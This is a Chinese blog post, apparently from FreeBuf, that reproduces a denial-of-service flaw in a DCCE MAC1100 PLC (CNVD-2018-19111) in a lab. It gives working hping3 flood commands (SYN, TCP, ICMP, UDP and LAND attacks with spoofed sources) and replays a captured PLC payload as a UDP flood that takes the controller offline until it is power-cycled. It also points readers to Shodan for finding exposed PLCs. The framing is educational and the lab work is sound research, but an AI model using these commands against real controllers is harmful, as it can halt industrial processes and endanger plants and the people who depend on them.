##  一、前言

**自从购买了PLC设备后，经常在网上搜索一些关于PLC的漏洞进行复现，但网上根本找不到漏洞相关的exp，只好自己摸着石头过河。另外，下周正好也有工控的项目将要实施，利用周末的时间继续展开研究吧，可谓临近磨刀又快又光。**

在之前也用过Kali的hping3命令，但是没有对其深入研究，在此笔者本着学习的态度借鉴了灯塔实验室大佬们的思路，使用hping3命令对plc进行了DDoS攻击实验，借此机会也对hping3命令进行了深入研究。于是将研究过程和成果记录下来，供大家学习与交流，技术菜、大佬勿喷、意见随便留！

##  二、漏洞简述

> 漏洞名称：DCCE MAC1100 PLC存在拒绝服务漏洞
>
> CNVD编号：CNVD-2018-19111
>
> 危害级别：高
>
> 漏洞描述：MAC1100 PLC是大连理工计算机控制工程有限公司生产的一款可编程逻辑控制器。DCCE MAC1100
> PLC存在拒绝服务漏洞，攻击者可通过非授权的构造特定的网络数据包，利用漏洞导致PLC拒绝服务。
>
> 漏洞解决方案：厂商尚未提供漏洞修复方案，请关注厂商主页更新：[http://www.dcce.cn](http://www.dcce.cn/)
>
> 漏洞链接：<https://www.cnvd.org.cn/patchInfo/show/137915>

##  三、Hping3简介

Hping3是一款免费的数据包生成器和分析器。可用于安全审计、防火墙规则测试、网络测试、端口扫描、性能测试，压力测试(DOS)，几乎可以发送任意类型的TCP/IP数据包。功能强大但是每次只能向一个IP地址发送数据包，还能够在两个相互包含的通道之间传送文件。

###  3.1 Hping3安装

命令：apt install hping3

###  3.2 Hping3参数帮助：

    
    
    -H --help 显示帮助。
    -v -VERSION 版本信息。
    -c --count count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。
    -i --interval 包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发10个数据包。
    -n -nmeric 数字输出，象征性输出主机地址。
    -q -quiet 退出。
    -I --interface interface name 无非就是eth0之类的参数。
    -v --verbose 显示很多信息，TCP回应一般如：len=46 ip=192.168.1.1 flags=RADF seq=0 ttl=255 id=0 win=0 rtt=0.4ms tos=0 iplen=40 seq=0 ack=1380893504 sum=2010 urp=0
    -D --debug 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......）
    -z --bind 快捷键的使用。
    -Z --unbind 消除快捷键。
    -O --rawip RAWIP模式，在此模式下HPING会发送带数据的IP头。
    -1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。
    -2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。
    -9 --listen signatuer hping的listen模式，用此模式，HPING会接收指定的数据。
    -a --spoof hostname 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。
    -t --ttl time to live 可以指定发出包的TTL值。
    -H --ipproto 在RAW IP模式里选择IP协议。
    -w --WINID UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。
    -r --rel 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。
    -F --FRAG 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是16字节。
    -x --morefrag 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。
    -y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。
    -G --fragoff fragment offset value set the fragment offset
    -m --mtu mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。
    -G --rroute 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。
    -C --ICMPTYPE type 指定ICMP类型，缺省是ICMP echo REQUEST。
    -K --ICMPCODE CODE 指定ICMP代号，缺省0。
    --icmp-ipver 把IP版本也插入IP头。
    --icmp-iphlen 设置IP头的长度，缺省为5（32字节）。
    --icmp-iplen 设置IP包长度。
    --icmp-ipid 设置ICMP报文IP头的ID，缺省是RANDOM。
    --icmp-ipproto 设置协议的，缺省是TCP。
    -icmp-cksum 设置校验和。
    -icmp-ts alias for --icmptype 13 (to send ICMP timestamp requests)
    --icmp-addr Alias for --icmptype 17 (to send ICMP address mask requests)
    -s --baseport source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。
    -p --deskport [+][+]desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。
    --keep 上面说过了。
    -w --win 发的大小和windows一样大，64BYTE。
    -O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / 4.
    -m --tcpseq 设置TCP序列数。
    -l --tcpck 设置TCP ack。
    -Q --seqnum 搜集序列号的，这对于你分析TCP序列号有很大作用。

###  3.3 Hping3测试

命令：hping3 -1 192.168.1.181（类似于ping命令）

![](https://image.3001.net/images/20200315/1584271680_5e6e11408c762.png!small)

###  3.4 单端口探测

命令：hping3 -I eth0 -p 22 -c 1 -S 192.168.100.104

![](https://image.3001.net/images/20200315/1584271689_5e6e11492d696.png!small)

SYN+ACK表示22端口开放

命令：hping3 -I eth0 -p 21 -c 1 -S 192.168.100.104

![](https://image.3001.net/images/20200315/1584271700_5e6e11545e696.png!small)

RST+ACK表示21端口关闭或被过滤

###  3.5 多端口探测

命令：hping3 -8 1-1024 192.168.100.102

![](https://image.3001.net/images/20200315/1584271709_5e6e115ddd1fd.png!small)

###  3.6 文件传输

    
    
    发送端：
    hping3 -2 -p 1373 192.168.100.102 -d 100 -E test.txt
    -2 UDP模式 -p端口
    -d 数据大小 -E 文件名

![](https://image.3001.net/images/20200315/1584271722_5e6e116a759a6.png!small)

    
    
    接收端：
    nc -lp 1373 -u -w 5 > recv.txt && cat recv.txt
    -l 监听模式 -p 端口
    -w 超时时间 -u UDP模式

![](https://image.3001.net/images/20200315/1584271732_5e6e1174bc080.png!small)

###  3.7 主机发现

虽然hping3一次只能扫描一个IP，但是我们可以结合shell脚本语言完成整个网段的扫描。下面使用for循环来实现：

for addr in $(seq 1 254);do hping3 10.211.55.$addr -c 1 –icmp & done

![](https://image.3001.net/images/20200315/1584271742_5e6e117e77ed2.png!small)

###  3.8 DDoS攻击-Syn Flood攻击

    
    
    hping3 -c 1000 -d 120 -S -p 80 --flood --rand-source 192.168.100.1
    -c 指定连接数 -p 目标端口
    -d 指定数据部分的大小 -S 攻击类型是Syn flood
    --flood 以泛洪的方式攻击 -–rand-source 随机产生伪造源地址

![](https://image.3001.net/images/20200315/1584271749_5e6e118569d41.png!small)

-–rand-source 随机产生伪造源地址

![](https://image.3001.net/images/20200315/1584271755_5e6e118b4731b.png!small)

###  3.9 DDoS攻击-TCP Flood攻击

使用以下命令建立全连接：

    
    
    hping3 -SARUPF -p 80 –-flood –-rand-source 192.168.100.1

![](https://image.3001.net/images/20200315/1584271764_5e6e119461c15.png!small)

![](https://image.3001.net/images/20200315/1584271771_5e6e119b9b0ae.png!small)

###  3.10 DDoS攻击-ICMP Flood攻击

    
    
    hping3 -q -n -d 200 --icmp --flood -a 11.11.11.11 192.168.100.1
    -q安静模式 -n不解析域名 -a指定伪造IP

![](https://image.3001.net/images/20200315/1584271781_5e6e11a5a2ba1.png!small)

###  3.11 DDoS攻击-UDP Flood 攻击

    
    
    hping3 --udp -s 6666 -p 53 -a 8.8.8.8 --flood 192.168.100.1

![](https://image.3001.net/images/20200315/1584271792_5e6e11b04f868.png!small)

###  3.12 DDoS攻击-LAND攻击

    
    
    hping3 -n -S -p 80 -a 192.168.100.1 --flood 192.168.100.1

![](https://image.3001.net/images/20200315/1584271802_5e6e11ba9c47b.png!small)

##  四、攻击环境

> 攻击机1：Win7 192.168.1.88
>
> 攻击机2：Kali 192.168.1.182
>
> 靶机PLC：大工Mac1100系列 192.168.1.181
>
> 软件：PLC_Config、Wireshark、Hping3、tcpdump

##  五、攻击过程

 **1.首先要使得PLC_Config组态软件连接PLC，具体步骤可参考《MAC系列可编程控制器使用手册V2.0.pdf》**

>
> PDF下载链接：<http://www.dcce.cn/DownLoadFiles/MAC%E7%B3%BB%E5%88%97%E5%8F%AF%E7%BC%96%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%99%A8%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8CV2.0.pdf>

![](https://image.3001.net/images/20200315/1584271812_5e6e11c44635a.png!small)

上图可以看到PLC控制器已上线，让PLC全速运行。

![](https://image.3001.net/images/20200315/1584271821_5e6e11cd29f23.png!small)

**2.抓取关键通讯报文**

此处我们以PLC程序下载的报文来进行DDoS攻击，打开Wireshark进行抓包

Wireshark语法:udp and ip.src == 192.168.1.88 and ip.addr == 192.168.1.181

筛选出udp协议、源IP为192.168.1.88、目的IP为192.168.1.181的数据包

![](https://image.3001.net/images/20200315/1584271852_5e6e11ec00ba8.png!small)

![](https://image.3001.net/images/20200315/1584271859_5e6e11f39101a.png!small)

复制Data字段的Hex Stream：0c00478510000a0000009f0000000000

 **3.使用Hping3发起DDoS攻击**

Hping3命令：

hping3 -p 11000 -2 192.168.1.181 -e 0c00478510000a0000009f0000000000 --flood
--rand-source

![](https://image.3001.net/images/20200315/1584271865_5e6e11f95655a.png!small)

tcpdump抓包查看流量：

![](https://image.3001.net/images/20200315/1584271877_5e6e1205795ca.png!small)

DDoS攻击效果：

![](https://image.3001.net/images/20200315/1584271886_5e6e120e6972a.png!small)

可见，PLC直接掉线，且无法恢复正常工作运行。

![](https://image.3001.net/images/20200315/1584271893_5e6e12154166e.png!small)

需断电重启后，PLC再次正常上线运行。

![](https://image.3001.net/images/20200315/1584271900_5e6e121cbbcf9.png!small)

综上，此实验达到了PLC DDoS攻击的效果。

##  六、总结

PLC
原本仅仅是为自动化控制而开发，在其开发之初，其应用场景是极其封闭的，几乎不能与工业内网外的任何第三方设备有所接触，但是近几年互联网的迅猛发展，和物联网、智能硬件的出现，开始逐渐有工业
PLC 暴露在公网之中，大家可以去seebug和shodan上搜索schneider或者siemens等厂商型号来发现公网上的plc设备。

尽管如此，目前PLC的安全性是十分十分差的。首先来说，plc的固件迭代更新缓慢，虽然厂商可能进行维护和更新，但是给工业控制网络中的正在运行的线上plc更新固件，代价是异常巨大的，一次关机可能就是整个工厂的停止运行。其次，目前的plc已经有了一些比较低级的访问控制手段，但是很少有人会主动开启，因为它会降低plc的运行效率和稳定性。
因此，一般来说，如果某个plc面向公网开放，我们可以向其加载任意代码。

除了在权限控制上的严重问题，攻击者有可能利用plc作为一个进入生产网络甚至公司内网的网关。

关于更多“PLC网络安全防护技术”可以参考以下两篇文章：

> PLC信息安全防护技术研究（上篇） <https://www.sohu.com/a/256459887_99909589>
>
> PLC信息安全防护技术研究（下篇） <https://www.sohu.com/a/257654711_99909589>

##  七、参考资料

> hping3命令帮助文档 <https://wangchujiang.com/linux-command/c/hping3.html>
>
> hping3使用 <https://mochazz.github.io/2017/07/23/hping3/>
>
> 公网开放的plc设备 —— 一种新型的后门 – 路人甲 <http://www.vuln.cn/6733>

##  八、关联阅读

> 工控安全从入门到实战——概述（一） <https://mp.weixin.qq.com/s/JoBQ-RB5ANRrf2ic8ArDpQ>
>
> 工控安全从入门到实战——概述（二） <https://mp.weixin.qq.com/s/G7E8dslSN5S3wk3RrJL8BQ>
>
> Siemens PLC指纹提取方法汇总 <https://mp.weixin.qq.com/s/de3whqmwVtwWWZ8B6J7Zww>
>
> 大工PLC PLC远程启停攻击实验 <https://mp.weixin.qq.com/s/k9tSpQaaeJ7QKSa9cb_bWg>
>
> 工控安全入门之攻与防 <https://mp.weixin.qq.com/s/k4a4FgziQ3toTh5**-zNWA>
>
> Snort入侵检测系统的应用 <https://mp.weixin.qq.com/s/pjzYte3p-l1CoybGM1v0eQ>

***本文作者： VllTomFord，转载请注明来自FreeBuf.COM**  
  
  

